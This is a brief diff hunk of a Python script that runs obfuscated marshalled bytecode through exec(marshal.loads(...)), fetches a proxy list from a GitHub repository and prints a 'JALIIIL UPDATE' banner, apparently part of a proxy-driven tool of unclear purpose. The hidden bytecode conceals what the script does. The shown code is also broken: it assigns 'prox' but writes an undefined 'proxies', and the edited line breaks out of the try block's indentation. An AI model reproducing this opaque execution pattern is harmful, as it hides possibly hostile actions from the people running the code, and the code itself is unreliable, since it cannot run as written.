@@ -25,7 +25,7 @@ exec(marshal.loads(b'\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\x0
 
 try:
     prox= requests.get('https://github.com/jalilha/jalil/blob/main/proxies.txt').text
-	open('proxies.txt','w').write(proxies)
+open('proxies.txt','w').write(proxies)
 except Exception as e:
     print('\x1b[1;92m[√] PLEASE WAIT CHECKING JALIIIL UPDATE...')
 	
